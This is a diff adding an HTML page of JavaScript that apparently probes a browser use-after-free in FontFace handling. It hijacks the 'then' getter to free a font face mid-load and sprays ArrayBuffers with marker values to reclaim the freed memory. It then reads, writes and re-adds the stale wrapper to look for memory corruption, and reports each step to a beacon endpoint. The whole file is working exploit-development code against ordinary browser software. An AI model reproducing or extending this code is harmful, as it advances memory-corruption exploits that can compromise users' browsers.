@@ -1,0 +1,237 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1148</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1148: POST-UAF RE-ADD + PROPERTY WRITE ===');
+log('info','Q1: Can we re-add a FontFace after its CSSFontFace is freed?');
+log('info','Q2: Do property writes go through the stale internal pointer?');
+log('info','Q3: Does fonts.load() on a re-added stale wrapper access freed memory?');
+B('P1148-START','t='+Date.now());
+
+// ===== PHASE 1: Standard UAF + reclaim =====
+var r=Date.now()%100000;
+var spray=[];
+var savedFF=null; // keep reference to freed FontFace wrapper
+var uafHit=false;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  log('ok','UAF: then getter fired');
+  savedFF=this; // save reference to the FontFace wrapper!
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  // Reclaim with MARKER pattern
+  for(var k=0;k<60;k++){
+    var ab=new ArrayBuffer(192);
+    var v=new BigUint64Array(ab);
+    v[0]=0xAAAA0001n; v[1]=0xBBBB0002n;
+    v[2]=0xCCCC0003n; v[3]=0xDDDD0004n;
+    spray.push(ab);
+  }
+  log('ok','Freed + sprayed '+spray.length+' marker bufs');
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(!uafHit||!savedFF){
+    log('fail','UAF did not trigger');
+    B('P1148-RESULT','uaf=false');
+    B('P1148-DONE','nohit');
+    return;
+  }
+
+  // Confirm we have the reclaimed buffer
+  var rIdx=-1;
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    if(v[0]===0xAAAA0001n){continue;} // our marker, not reclaimed
+    if(v[0]!==0n){rIdx=k;break;}
+  }
+  // Also check for CSSFontFace residue in the non-marker buffers
+  var foundCFF=false;
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    // CSSFontFace fingerprint: q0 nonzero, q1-q10 zero, q11 nonzero
+    if(v[0]!==0xAAAA0001n && v[0]!==0n){
+      foundCFF=true; rIdx=k; break;
+    }
+  }
+
+  log('info','Reclaim idx='+rIdx+' foundCFF='+foundCFF);
+  B('P1148-RECLAIM','idx='+rIdx+'|cff='+foundCFF);
+
+  // ===== PHASE 2: Read properties via stale wrapper =====
+  log('phase','--- Phase 2: Read stale wrapper properties ---');
+  var props={};
+  try{props.family=savedFF.family;}catch(e){props.family='ERR:'+e.message.substring(0,40);}
+  try{props.status=savedFF.status;}catch(e){props.status='ERR:'+e.message.substring(0,40);}
+  try{props.style=savedFF.style;}catch(e){props.style='ERR:'+e.message.substring(0,40);}
+  try{props.weight=savedFF.weight;}catch(e){props.weight='ERR:'+e.message.substring(0,40);}
+  try{props.display=savedFF.display;}catch(e){props.display='ERR:'+e.message.substring(0,40);}
+  try{props.unicodeRange=savedFF.unicodeRange;}catch(e){props.unicodeRange='ERR:'+e.message.substring(0,40);}
+
+  log('info','family='+props.family+' status='+props.status);
+  log('info','style='+props.style+' weight='+props.weight+' display='+props.display);
+  B('P1148-PROPS','fam='+props.family+'|stat='+props.status+'|style='+props.style+'|wt='+props.weight);
+
+  // ===== PHASE 3: Write properties via stale wrapper =====
+  log('phase','--- Phase 3: Write to stale wrapper ---');
+
+  // Snapshot spray markers BEFORE writes
+  var pre=[];
+  for(var k=0;k<Math.min(spray.length,5);k++){
+    var v=new BigUint64Array(spray[k]);
+    pre.push([hex64(v[0]),hex64(v[1]),hex64(v[2]),hex64(v[3])]);
+  }
+
+  var writeResults={};
+  try{savedFF.family='DEADFONT';writeResults.family='ok';}catch(e){writeResults.family='ERR:'+e.message.substring(0,40);}
+  try{savedFF.style='italic';writeResults.style='ok';}catch(e){writeResults.style='ERR:'+e.message.substring(0,40);}
+  try{savedFF.weight='bold';writeResults.weight='ok';}catch(e){writeResults.weight='ERR:'+e.message.substring(0,40);}
+  try{savedFF.display='swap';writeResults.display='ok';}catch(e){writeResults.display='ERR:'+e.message.substring(0,40);}
+  try{savedFF.unicodeRange='U+0061-007A';writeResults.unicodeRange='ok';}catch(e){writeResults.unicodeRange='ERR:'+e.message.substring(0,40);}
+
+  log('info','Write results: '+JSON.stringify(writeResults));
+  B('P1148-WRITES','fam='+writeResults.family+'|style='+writeResults.style+'|wt='+writeResults.weight+'|disp='+writeResults.display);
+
+  // Check if spray markers changed AFTER writes
+  var writeHits=0;
+  var writeDetails=[];
+  for(var k=0;k<spray.length;k++){
+    var v=new BigUint64Array(spray[k]);
+    var changed=false;
+    // Check markers
+    if(v[0]!==0xAAAA0001n && pre[k] && hex64(v[0])!==pre[k][0]) changed=true;
+    if(v[1]!==0xBBBB0002n && pre[k] && hex64(v[1])!==pre[k][1]) changed=true;
+    // Check zero slots
+    for(var q=4;q<24;q++){if(v[q]!==0n){changed=true;break;}}
+    if(changed){
+      writeHits++;
+      if(writeDetails.length<5){
+        var d=[];
+        for(var q=0;q<8;q++) d.push(hex64(v[q]));
+        writeDetails.push({idx:k,d:d});
+      }
+    }
+  }
+
+  log(writeHits>0?'win':'info','Spray modified after writes: '+writeHits);
+  B('P1148-WRITE-CHK','hits='+writeHits);
+  if(writeHits>0){
+    log('win','!!! PROPERTY WRITES GO THROUGH STALE POINTER !!!');
+    for(var i=0;i<writeDetails.length;i++){
+      log('ptr','buf['+writeDetails[i].idx+']: '+writeDetails[i].d.slice(0,4).join(' '));
+      if(i<3) B('P1148-WMOD-'+i,writeDetails[i].d.slice(0,4).join(','));
+    }
+  }
+
+  // ===== PHASE 4: Re-add to document.fonts + force load =====
+  log('phase','--- Phase 4: Re-add stale wrapper + fonts.load ---');
+  var readded=false;
+  try{document.fonts.add(savedFF);readded=true;log('ok','Re-add: SUCCESS');}
+  catch(e){log('fail','Re-add: '+e.message);readded=false;}
+  B('P1148-READD','ok='+readded);
+
+  if(readded){
+    // Check spray after re-add
+    var afterAdd=0;
+    for(var k=0;k<spray.length;k++){
+      var v=new BigUint64Array(spray[k]);
+      if(v[0]!==0xAAAA0001n && v[0]!==0n){
+        // Check if q4+ changed (engine wrote metadata during add)
+        for(var q=4;q<24;q++){if(v[q]!==0n){afterAdd++;break;}}
+      }
+    }
+    log('info','Spray modified after re-add: '+afterAdd);
+    B('P1148-READD-CHK','modified='+afterAdd);
+
+    // Now try fonts.load — this should access the CSSFontFace for matching
+    try{
+      document.fonts.load('1em y'+r,'A').then(function(fonts){
+        log('ok','fonts.load resolved: '+fonts.length+' fonts');
+        B('P1148-LOAD','fonts='+fonts.length);
+        checkFinal();
+      },function(err){
+        log('info','fonts.load rejected: '+err);
+        B('P1148-LOAD','err='+String(err).substring(0,60));
+        checkFinal();
+      });
+    }catch(e){
+      log('fail','fonts.load threw: '+e.message);
+      B('P1148-LOAD','throw='+e.message.substring(0,60));
+      checkFinal();
+    }
+
+    // Also try: create elements with the font
+    var newSt=document.createElement('style');
+    newSt.textContent=".stalefont{font-family:y"+r+",serif;font-size:48px;}";
+    document.head.appendChild(newSt);
+    for(var i=0;i<10;i++){
+      var el=document.createElement('div');
+      el.className='stalefont';
+      el.textContent='STALE FONT TEST '+i;
+      document.body.appendChild(el);
+    }
+    document.body.offsetHeight;
+    log('ok','Forced layout with re-added stale font');
+    B('P1148-LAYOUT','done');
+  }else{
+    checkFinal();
+  }
+
+  function checkFinal(){
+    // Final spray check
+    var finalChanged=0;
+    var finalDetails=[];
+    for(var k=0;k<spray.length;k++){
+      var v=new BigUint64Array(spray[k]);
+      var mismatch=false;
+      if(v[0]!==0xAAAA0001n){
+        for(var q=4;q<24;q++){if(v[q]!==0n){mismatch=true;break;}}
+      }
+      if(mismatch){
+        finalChanged++;
+        if(finalDetails.length<5){
+          var d=[];for(var q=0;q<8;q++) d.push(hex64(v[q]));
+          finalDetails.push({idx:k,d:d});
+        }
+      }
+    }
+
+    log('phase','--- Final spray check ---');
+    log(finalChanged>0?'win':'info','Final modified: '+finalChanged);
+    B('P1148-FINAL','changed='+finalChanged);
+    if(finalChanged>0){
+      for(var i=0;i<finalDetails.length;i++){
+        log('ptr','buf['+finalDetails[i].idx+']: '+finalDetails[i].d.slice(0,4).join(' '));
+        if(i<3) B('P1148-FMOD-'+i,finalDetails[i].d.slice(0,4).join(','));
+      }
+    }
+
+    B('P1148-DONE','complete');
+    log('phase','=== P1148 COMPLETE ===');
+  }
+
+  // Timeout safety for fonts.load
+  setTimeout(function(){
+    if(!readded) return;
+    checkFinal();
+  },200);
+},80);
+</script></body></html>
